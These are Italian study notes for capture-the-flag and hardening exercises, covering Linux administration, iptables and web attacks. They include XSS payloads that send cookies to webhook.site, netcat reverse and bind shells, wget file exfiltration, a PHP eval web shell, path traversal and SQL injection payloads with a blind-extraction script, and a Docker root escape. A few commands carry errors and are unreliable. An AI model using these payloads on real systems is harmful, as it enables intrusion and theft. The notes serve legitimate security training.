Esercizi cysec /\* cspell:disable-file \*/ /\* webkit printing magic: print all background colors \*/ html { -webkit-print-color-adjust: exact; } \* { box-sizing: border-box; -webkit-print-color-adjust: exact; } html, body { margin: 0; padding: 0; } @media only screen { body { margin: 2em auto; max-width: 900px; color: rgb(55, 53, 47); } } body { line-height: 1.5; white-space: pre-wrap; } a, a.visited { color: inherit; text-decoration: underline; } .pdf-relative-link-path { font-size: 80%; color: #444; } h1, h2, h3 { letter-spacing: -0.01em; line-height: 1.2; font-weight: 600; margin-bottom: 0; } .page-title { font-size: 2.5rem; font-weight: 700; margin-top: 0; margin-bottom: 0.75em; } h1 { font-size: 1.875rem; margin-top: 1.875rem; } h2 { font-size: 1.5rem; margin-top: 1.5rem; } h3 { font-size: 1.25rem; margin-top: 1.25rem; } .source { border: 1px solid #ddd; border-radius: 3px; padding: 1.5em; word-break: break-all; } .callout { border-radius: 3px; padding: 1rem; } figure { margin: 1.25em 0; page-break-inside: avoid; } figcaption { opacity: 0.5; font-size: 85%; margin-top: 0.5em; } mark { background-color: transparent; } .indented { padding-left: 1.5em; } hr { background: transparent; display: block; width: 100%; height: 1px; visibility: visible; border: none; border-bottom: 1px solid rgba(55, 53, 47, 0.09); } img { max-width: 100%; } @media only print { img { max-height: 100vh; object-fit: contain; } } @page { margin: 1in; } .collection-content { font-size: 0.875rem; } .column-list { display: flex; justify-content: space-between; } .column { padding: 0 1em; } .column:first-child { padding-left: 0; } .column:last-child { padding-right: 0; } .table\_of\_contents-item { display: block; font-size: 0.875rem; line-height: 1.3; padding: 0.125rem; } .table\_of\_contents-indent-1 { margin-left: 1.5rem; } .table\_of\_contents-indent-2 { margin-left: 3rem; } .table\_of\_contents-indent-3 { margin-left: 4.5rem; } .table\_of\_contents-link { text-decoration: none; opacity: 0.7; border-bottom: 1px solid rgba(55, 53, 47, 0.18); } table, th, td { border: 1px solid rgba(55, 53, 47, 0.09); border-collapse: collapse; } table { border-left: none; border-right: none; } th, td { font-weight: normal; padding: 0.25em 0.5em; line-height: 1.5; min-height: 1.5em; text-align: left; } th { color: rgba(55, 53, 47, 0.6); } ol, ul { margin: 0; margin-block-start: 0.6em; margin-block-end: 0.6em; } li > ol:first-child, li > ul:first-child { margin-block-start: 0.6em; } ul > li { list-style: disc; } ul.to-do-list { padding-inline-start: 0; } ul.to-do-list > li { list-style: none; } .to-do-children-checked { text-decoration: line-through; opacity: 0.375; } ul.toggle > li { list-style: none; } ul { padding-inline-start: 1.7em; } ul > li { padding-left: 0.1em; } ol { padding-inline-start: 1.6em; } ol > li { padding-left: 0.2em; } .mono ol { padding-inline-start: 2em; } .mono ol > li { text-indent: -0.4em; } .toggle { padding-inline-start: 0em; list-style-type: none; } /\* Indent toggle children \*/ .toggle > li > details { padding-left: 1.7em; } .toggle > li > details > summary { margin-left: -1.1em; } .selected-value { display: inline-block; padding: 0 0.5em; background: rgba(206, 205, 202, 0.5); border-radius: 3px; margin-right: 0.5em; margin-top: 0.3em; margin-bottom: 0.3em; white-space: nowrap; } .collection-title { display: inline-block; margin-right: 1em; } .page-description { margin-bottom: 2em; } .simple-table { margin-top: 1em; font-size: 0.875rem; empty-cells: show; } .simple-table td { height: 29px; min-width: 120px; } .simple-table th { height: 29px; min-width: 120px; } .simple-table-header-color { background: rgb(247, 246, 243); color: black; } .simple-table-header { font-weight: 500; } time { opacity: 0.5; } .icon { display: inline-block; max-width: 1.2em; max-height: 1.2em; text-decoration: none; vertical-align: text-bottom; margin-right: 0.5em; } img.icon { border-radius: 3px; } .user-icon { width: 1.5em; height: 1.5em; border-radius: 100%; margin-right: 0.5rem; } .user-icon-inner { font-size: 0.8em; } .text-icon { border: 1px solid #000; text-align: center; } .page-cover-image { display: block; object-fit: cover; width: 100%; max-height: 30vh; } .page-header-icon { font-size: 3rem; margin-bottom: 1rem; } .page-header-icon-with-cover { margin-top: -0.72em; margin-left: 0.07em; } .page-header-icon img { border-radius: 3px; } .link-to-page { margin: 1em 0; padding: 0; border: none; font-weight: 500; } p > .user { opacity: 0.5; } td > .user, td > time { white-space: nowrap; } input\[type="checkbox"\] { transform: scale(1.5); margin-right: 0.6em; vertical-align: middle; } p { margin-top: 0.5em; margin-bottom: 0.5em; } .image { border: none; margin: 1.5em 0; padding: 0; border-radius: 0; text-align: center; } .code, code { background: rgba(135, 131, 120, 0.15); border-radius: 3px; padding: 0.2em 0.4em; border-radius: 3px; font-size: 85%; tab-size: 2; } code { color: #eb5757; } .code { padding: 1.5em 1em; } .code-wrap { white-space: pre-wrap; word-break: break-all; } .code > code { background: none; padding: 0; font-size: 100%; color: inherit; } blockquote { font-size: 1.25em; margin: 1em 0; padding-left: 1em; border-left: 3px solid rgb(55, 53, 47); } .bookmark { text-decoration: none; max-height: 8em; padding: 0; display: flex; width: 100%; align-items: stretch; } .bookmark-title { font-size: 0.85em; overflow: hidden; text-overflow: ellipsis; height: 1.75em; white-space: nowrap; } .bookmark-text { display: flex; flex-direction: column; } .bookmark-info { flex: 4 1 180px; padding: 12px 14px 14px; display: flex; flex-direction: column; justify-content: space-between; } .bookmark-image { width: 33%; flex: 1 1 180px; display: block; position: relative; object-fit: cover; border-radius: 1px; } .bookmark-description { color: rgba(55, 53, 47, 0.6); font-size: 0.75em; overflow: hidden; max-height: 4.5em; word-break: break-word; } .bookmark-href { font-size: 0.75em; margin-top: 0.25em; } .sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; } .code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; } .serif { font-family: Lyon-Text, Georgia, ui-serif, serif; } .mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; } .pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; } .pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; } .pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; } .pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; } .pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; } .pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; } .pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; } .pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; } .pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; } .pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; } .pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; } .pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; } .pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; } .pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; } .pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; } .pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; } .highlight-default { color: rgba(50, 48, 44, 1); } .highlight-gray { color: rgba(115, 114, 110, 1); fill: rgba(115, 114, 110, 1); } .highlight-brown { color: rgba(159, 107, 83, 1); fill: rgba(159, 107, 83, 1); } .highlight-orange { color: rgba(217, 115, 13, 1); fill: rgba(217, 115, 13, 1); } .highlight-yellow { color: rgba(203, 145, 47, 1); fill: rgba(203, 145, 47, 1); } .highlight-teal { color: rgba(68, 131, 97, 1); fill: rgba(68, 131, 97, 1); } .highlight-blue { color: rgba(51, 126, 169, 1); fill: rgba(51, 126, 169, 1); } .highlight-purple { color: rgba(144, 101, 176, 1); fill: rgba(144, 101, 176, 1); } .highlight-pink { color: rgba(193, 76, 138, 1); fill: rgba(193, 76, 138, 1); } .highlight-red { color: rgba(205, 60, 58, 1); fill: rgba(205, 60, 58, 1); } .highlight-default\_background { color: rgba(50, 48, 44, 1); } .highlight-gray\_background { background: rgba(248, 248, 247, 1); } .highlight-brown\_background { background: rgba(244, 238, 238, 1); } .highlight-orange\_background { background: rgba(251, 236, 221, 1); } .highlight-yellow\_background { background: rgba(251, 243, 219, 1); } .highlight-teal\_background { background: rgba(237, 243, 236, 1); } .highlight-blue\_background { background: rgba(231, 243, 248, 1); } .highlight-purple\_background { background: rgba(248, 243, 252, 1); } .highlight-pink\_background { background: rgba(252, 241, 246, 1); } .highlight-red\_background { background: rgba(253, 235, 236, 1); } .block-color-default { color: inherit; fill: inherit; } .block-color-gray { color: rgba(115, 114, 110, 1); fill: rgba(115, 114, 110, 1); } .block-color-brown { color: rgba(159, 107, 83, 1); fill: rgba(159, 107, 83, 1); } .block-color-orange { color: rgba(217, 115, 13, 1); fill: rgba(217, 115, 13, 1); } .block-color-yellow { color: rgba(203, 145, 47, 1); fill: rgba(203, 145, 47, 1); } .block-color-teal { color: rgba(68, 131, 97, 1); fill: rgba(68, 131, 97, 1); } .block-color-blue { color: rgba(51, 126, 169, 1); fill: rgba(51, 126, 169, 1); } .block-color-purple { color: rgba(144, 101, 176, 1); fill: rgba(144, 101, 176, 1); } .block-color-pink { color: rgba(193, 76, 138, 1); fill: rgba(193, 76, 138, 1); } .block-color-red { color: rgba(205, 60, 58, 1); fill: rgba(205, 60, 58, 1); } .block-color-default\_background { color: inherit; fill: inherit; } .block-color-gray\_background { background: rgba(248, 248, 247, 1); } .block-color-brown\_background { background: rgba(244, 238, 238, 1); } .block-color-orange\_background { background: rgba(251, 236, 221, 1); } .block-color-yellow\_background { background: rgba(251, 243, 219, 1); } .block-color-teal\_background { background: rgba(237, 243, 236, 1); } .block-color-blue\_background { background: rgba(231, 243, 248, 1); } .block-color-purple\_background { background: rgba(248, 243, 252, 1); } .block-color-pink\_background { background: rgba(252, 241, 246, 1); } .block-color-red\_background { background: rgba(253, 235, 236, 1); } .select-value-color-default { background-color: rgba(84, 72, 49, 0.08); } .select-value-color-gray { background-color: rgba(84, 72, 49, 0.15); } .select-value-color-brown { background-color: rgba(210, 162, 141, 0.35); } .select-value-color-orange { background-color: rgba(224, 124, 57, 0.27); } .select-value-color-yellow { background-color: rgba(236, 191, 66, 0.39); } .select-value-color-green { background-color: rgba(123, 183, 129, 0.27); } .select-value-color-blue { background-color: rgba(93, 165, 206, 0.27); } .select-value-color-purple { background-color: rgba(168, 129, 197, 0.27); } .select-value-color-pink { background-color: rgba(225, 136, 179, 0.27); } .select-value-color-red { background-color: rgba(244, 171, 159, 0.4); } .checkbox { display: inline-flex; vertical-align: text-bottom; width: 16; height: 16; background-size: 16px; margin-left: 2px; margin-right: 5px; } .checkbox-on { background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E"); } .checkbox-off { background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E"); }

Esercizi cysec
==============

**All’inizio del codice bash:**

    #! /usr/bin/env bash
    (oppure)
    #! /bin/bash

**Ripassino di SED**

    sed '/pattern/ d' file #cancella il file
    sed '/pattern/ c\nuova_riga' file #modifica il file con quello che segue c
    
    #altri pattern utili:
    #sostituire l'occorrenza in una riga
    s/vecchio/nuovo
    #sostituire tutte le occorrenze di una riga
    s/vecchio/nuovo/g
    #sostituire vecchio con nuovo solo alla quarta occorrenza della riga
    sed '4s/pattern/sostituto/g' file
    #sostituire vecchio con nuovo solo alla quarta occorrenza di vecchio in ogni riga
    sed 's/pattern/sostituto/4' file

**Ripassino Permessi**

    SUID = 100 = 4
    GUID = 010 = 2
    Sticky = 001 = 1
    
    r = 100 = 4
    w = 010 = 2
    x = 001 = 1
    #e combinati sempre in binario! -> SUID + rw + niente + niente = 4600

**Ripasso iptables**

    sudo iptables 
    -A/F/P INPUT/OUTPUT/FORWARD #(A)inserisce nuova regola, (F)Flusha tutto o (P)Policy predefinita
    -i <interfaccia input(es.lo, eth0,wlan0,docker,enp0s3)> 
    -o <interfaccia output>
    -p <protocollo(es.tcp,udp,icmp,esp)> 
    -m multiport #per specificare più porte
    -dport <numero_porta_destinazione (per output)>
    -sport <numero_porta_source (per input)> 
    -s <ip_source>
    -d <ip_destination>
    -m state --state NEW,ESTABLISHED,INVALID #stati del pacchetto
    -j ACCEPT/DROP/REJECT/LOG #azioni all'arrivo di un pacchetto valido (jump)
    #nota -j serve sempre tranne che per la policy predefinita!

Altro su iptables

    iptables -L #mostra configurazione attuale
    
    iptables-save #per mostrare in output la corrente
    iptables-save > file.txt #per salvare
    
    iptables-restore < file.txt #per restorare

**Linux system**

    ps -aux #controlla i processi
    netstat -tulnp #controllo porte apert
    
    
    systemctl #controllo systemd - overview del OS
    systemctl list-unit-files --state=enabled #controlla i servizi enabled
    systemctl start/enable/stop servizio #avvia, avvia al boot o spegne un servizio
    
    journalctl -u <unit> #prende i log da unit
    
    #cosa succede se il processo crasha, 
    #quale utente lo esegue, variabili d'ambiente -> systemctl
    #cambi file unit in /etc/systemd/system
    
    #user definito in /etc/shadow (adduser per crearne nuovi)
    #gruppi in /etc/group
    #password in /etc/shadow (criptate e accessibili solo a root)
    
    #PAM - configurazione pam.d per cambiare requisiti password
    #Logs - /var/log 

**Ripasso JavaScript \[utile in XSS\]**

    alert('XSS')  #test alert per vedere se funziona js
    document.location.href #url posizione
    document.cookie #ruba cookie
    
    fetch("https://webhook.site/?" + document.cookie) #esfiltra dati verso sito attaccante
    
    #in generale in html si mette tra <script></script> però spesso è blacklistato:
    #in questo caso richiamo con attributi evento:
    <img src="x" onerror="fetch('webhook_link' + document.cookie)">

**Ripassino PHP**

    <?php ... ?>
    
    #funzioni utili:
    #echo: stampa a schermo
    echo "Ciao " . $_GET['name']; 
    print("")
    
    #funzioni di sistema
    exec()
    system()
    eval()
    
    #metodi superglobali
    $_GET['x']	#Dato via URL (?x=...)
    $_POST['x']	#Dato via form (metodo POST)
    
    #altro
    var_dump è una funzione che printa tutto il contenuto di una variabile
    
    $y = array(”x” => “Hello”); #array associativi
    print($y[x]); #ci si accede così

**Ripasso Python Requests**

    import requests
    
    url = 'http://xss1.challs.cyberchallenge.it/report'
    r = requests.get(url)
    print("ricevuto: ", r.status_code)
    print("cookies: ", r.cookies)
    
    #Uso un cookie mio in una get
    cookies = {'my_cookie': 'cookie_value'}
    r = requests.get(url, cookies=cookies)
    print("ricevuto: ", r.status_code)
    
    ## POST
    p=requests.post('url', data={'key': 'value'})
    print("ricevuto: ", p.json())
    
    
    # METODI DELETE, HEAD, OPTIONS
    r = requests.delete('https://httpbin.org/delete')
    r = requests.head('https://httpbin.org/get')
    r = requests.options('https://httpbin.org/get')

**Esfiltrare dati**

    nc -e /bin/bash host port #reverse shell (mi ci connetto con nc)
    wget  --post-file <file> http://webhook... #con command injection
    			--post-data <stringa_dati>

WEB SECURITY

*   **Command Injection - PHP Code Injection**
    
    *   **Command Injection**
        
            #codice generalmente PHP che esegue senza sanificazione
            #si aggiungono comandi separando con
            ";" , "\n", operatori logici, &&, ||
            
            #metodi per verificare che ci sia:
            sleep(5) #temporizzo per vedere se attende
        
    
    *   **PHP Code Injection**
        
            #Metodi:
            
            #inclusione file infetto caricato da me 
            #(es. logs con errore voluto con un errore voluto <?php ... ?>
            include ‘path/to/file’; 
            
            #Può capitare che posso inserire direttamente il codice
            <?php eval($_GET['c']); ?>
            #Per attivarla è sufficiente visitare il sito passandogli c come arg
            https://link/applicazione.php?c=phpinfo();
        
    

*   **File Disclosure - Path Traversal - Server Side Request Forgery (SSRF)**
    
    *   **File Disclosure con path traversal**
        
            #Funzione PHP open($url) #in sql injection
            open($input + '/file') #rubiamo un file pubblico
            
            #Con curl - sempre passando con php il valore dello static file
            curl http://link/static.php?static_file=/../../../../etc/passwd
            
        
    
    *   **SSRF**
        
        **Per trovare un SSRF**
        
        *   cerco URL sospetti
        
        *   A questo punto devi provare ad inserire hostnames interni come “**localhost**” o “**192.168.1.1**” o “**10.0.0.1**” e così via esaminando la risposta.
    
        https://localhost/filecercato #questo inserito in input al server viene letto come se la richiesta venisse da lui
        #alternativamente provo
        # 192.168.1.1
        # 10.0.0.1
    

*   **SQL Injection**
    
    *   **SQL Injection** (normale)
        
        *   Per riconoscerla provo caratteri speciali **‘ \\ “ \`** (backquote, altgr + ‘) - se crasha →
        
            " or 1=1 -- '
            # 1=1 per riportare almeno un risultato - ci puoi mettere quello che ti pare
            
            #wget per sqlinjection
            wget "http://target.com/page.php?id=1 UNION SELECT null,version()-- -"
        
    
    *   **UNION SQL Injection**
        
            #Verifico versione sql per vedere che tipo è (per mysql è:)
            union select 1,2, ..., version() 
            
            #Per conoscere nome colonne e nome table in mysql:
            ' union select 1,2,..., table_name from information_schema.tables -- '
            ' union select 1,2,table_name, column_name from information_schema.columns -- '
            
            #Nota: entrambe le query devono avere lo stesso numero di colonne e lo stesso tipo di dato
        
    
    *   **Blind SQL Injection**
        
        *   No output completo della query, ma solo informazioni sul fatto che sia abbia avuto successo o sia fallita.
        
        *   (SELECT 1 WHERE 1=1)='1 per verificare che funzioni il true/false (dovrebbe restituire true)
        
        *   Se non si conoscono i caratteri specifici che possono comparire nel dato da ricostruire, può essere utile istruire il database a codificarlo in formato esadecimale. In questo modo il numero di caratteri da testare si riduce a sedici, appartenenti all'alfabeto noto composto dalle cifre da 0 a 9 e le prime sei lettere dell'alfabeto.
        
        *   The `LIKE` operator is used in a `WHERE` clause to search for a specified pattern in a column. % rappresenta singoli caratteri
        
            #esempio si cerca un qualsiasi elemento che cominci con guess
            1' AND (SELECT 1 FROM secret WHERE HEX(asecret) LIKE 'guess%')='1
            #questo si fa a ripetizione con il codice python sotto:
            
            inj = Inj('http://web-17.challs.olicyber.it')
            
            dictionary = '0123456789abcdef'
            result = ''
            
            while True:
                for c in dictionary:
                    question = f"1' and (select 1 from secret where HEX(asecret) LIKE '{result+c}%')='1"
                    response, error = inj.blind(question)
                    print(response)
                    if response == 'Success': # We have a match!
                        result += c
                        break
                else:
                    break
            print('Result:', result)
        
    
    *   **Timed SQL Injection**
        
        olto simile a quella usata per una SQL injection blind: come prima dovremo scrivere un'altra query che faccia da oracolo, ma stavolta successo o fallimento saranno discriminati sulla base del tempo di risposta - inseriamo una sleep che si attiva solo se è vera la where.
        
            #in pratica si aggiunge uno sleep che si avvia nel momento in cui 
            #è vera l'espressione where
            1' AND (SELECT SLEEP(1) FROM flags WHERE HEX(flag) LIKE 'guess%')='1
            
            #la logica è questa:
            from time import time
            # Registriamo il tempo di inizio
            start = time()
            # Lanciamo la query...
            inj.time(...)
            # Confrontiamo il tempo finale con quello di partenza
            elapsed = time() - start
            if elapsed > 1:
                # match!
        
    

*   **XSS** - **CSRF**
    
    *   **XSS**
        
        Utilizzo javascript in mezzo ad html per fare XSS
        
            #Tramite url
            http://foo.bar/hello.php?name=<script>alert(1)</script>
            
            #con input altrimenti
            <img src="a" onerror="fetch('https://webhook.site/304b9e35-9408-47f6-a57e-a19ca61a9a0f/' + document.cookie)"></img>
        
    
    *   **CSRF**
    

HARDENING

1.  Attivare sudo utente per un solo file
    
        sudo visudo
        cysec ALL=(ALL) NOPASSWD: /usr/bin/nmap
    

2.  Configurare sudo per far eseguire comando specifico ma senza parametri
    
        sudo visudo
        cysec ALL=(ALL) NOPASSWD: /usr/bin/nmap ""
    

3.  Cercare tutti gli eseguibili con SUID | SGID | Sticky bit
    
        find / -perm -4000 
        find / -perm -2000
        find / -perm -1000
    
    (Nota che / è il punto di partenza, cioè root)
    

4.  Creare una shell aperta a tutti in attesa di connessione (e connettercisi)
    
        nc -lvp 4444 -e /bin/bash
        #Per connettersi: nc <ip> <port>
    

5.  Modificare configurazione pam per richiedere caratteristiche minime alle password (min 8 caratteri, maiuscole, minuscole, simboli)
    
        #backup e modifica
        sudo cp /etc/pam.d/common-password /etc/pam.d/common-password.bak
        sudo nano /etc/pam.d/common-password
        
        #modifico la riga della password che richiede i requisiti
        password requisite pam_pwquality.so retry=3 minlen=8 ucredit=-1 lcredit=-1 ocredit=-1
        
        #oppure usando SED '/pam_pwquality\.so/ c\ significa cambia la riga 
        #/pam_pwquality.so con quella che segue
        sudo sed '/pam_pwquality\.so/ c\password requisite pam_pwquality.so retry=3 minlen=8 ucredit=-1 lcredit=-1 ocredit=-1' /etc/pam.d/common-password
        
    

6.  Inserisci un password per grub per non permettere l’avvio dell’os con parametri del kernel non standard
    
        #creo la password sha
        grub-mkpasswd-pbkdf2
        #modifico il file di configurazione inserendo la password ottenuta
        sudo nano /etc/grub.d/40_custom #40_custom per modificare il grub!
        	#inserisco in NANO
        	set superusers="admin"
        	password_pbkdf2 admin <password_di_prima>
        
        #faccio update del grub
        sudo update-grub
    

7.  Rendi la cartella /var/log leggibile solo da root
    
        sudo chown root /var/log
        sudo chmod 400 /var/log
        
        #verifico
        ls -l /var/log 
    

8.  Configura utente per poter fare cat dei logs ma non essere amministratore
    
        #modifico sudoers
        sudo visudo
        #aggiungo o modifico
        cysec ALL=(root) NOPASSWD: /bin/cat /var/log/*
    

9.  Trova tutti i processi che hanno un file descriptor aperto dentro la cartella /var/log 
    
        #uso il comando lsof ricorsivamente (+D)
        sudo lsof +D /var/log
    

10.  Usa Docker per effettuare una privilege escalation
    
        #suggerito da chat *non ho potuto farlo su vm*
        docker run -v /:/mnt --rm -it debian chroot /mnt
        # in pratica avvia una shell interattiva (-it):
        # monta il filesystem dell'host / in docker su :/mnt
        # usando debian come immagine di base
        # e cambiando la radice del filesystem in /mnt
        # Così l'utente base può fare quello che gli pare!
    

11.  Cerca se ci sono directory/file scrivibili da tutti gli utenti in home
    
        # -type d cerca e directories
        # -o=w indica il permesso che cerco
        find /home -type d -perm -222
        
        #per i file sarebbe
        find /home -type f -perm -222
    

12.  Crea un utente la cui password scade ogni giorno
    
        #uso useradd e passwd per cambiare creare e cambiare utente, poi
        #chage per cambiare le impostazioni della password
        sudo useradd -m paperino
        sudo passwd paperino
        sudo chage -M 1 paperino
    

13.  Imposta iptables per permettere l’accesso alla macchina solo via SSH (TCP port 22)
    
        #flusho tutta la configurazione precedente
        sudo iptables -F INPUT
        sudo iptables -F OUTPUT
        sudo iptables -F FORWARD
        
        #setto policy di base per droppare tutto
        sudo iptables -P INPUT DROP
        sudo iptables -P OUTPUT DROP
        sudo iptables -P FORWARD DROP
        
        #aggiungo policy richieste
        sudo iptables -A INPUT -p tcp -dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT
        sudo iptables -A OUTPUT -p tcp -sport 22 -m state --state NEW,ESTABLISHED -j ACCEPT
        
        #aggiungo anche loopback per completezza
        sudo iptables -A INPUT -i lo -j ACCEPT
        sudo iptables -A OUTPUT -o lo -j ACCEPT
    

14.  Imposta iptables per permettere l’accesso alla macchina solo da ssh (tcp porta 22) con un ip 1.2.3.4 e dalla macchina ad un webserver qualunque (porte tcp 80,443)
    
        #flusho tutto
        sudo iptables -F INPUT 
        sudo iptables -F OUTPUT
        sudo iptables -F FORWARD
        
        #aggiorno la policy per droppare
        sudo iptables -P INPUT DROP
        sudo iptables -P OUTPUT DROP
        sudo iptables -P FORWARD DROP
        
        #aggiungo la policy per il lo
        sudo iptables -A INPUT -i lo -j ACCEPT
        sudo iptables -A OUTPUT -o lo -j ACCEPT
        
        #aggiungo le mie policy 
        sudo iptables -A INPUT -p tcp --dport 22 -s 1.2.3.4 -m state --state NEW,ESTABLISHED -j ACCEPT
        sudo iptables -A OUTPUT -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT
        sudo iptables -A OUTPUT -p tcp -m multiport --dport 80,443 -m state --state NEW,ESTABLISHED -j ACCEPT
        sudo iptables -A INPUT -p tcp -m multiport --sport 80,443 -m state --state ESTABLISHED -j ACCEPT
    
    Nota che per bloccare la navigazione internet degli utenti è sufficiente cancellare NEW in output su 80,433 perchè a noi serve solo ESTABLISHED per far funzionare il server
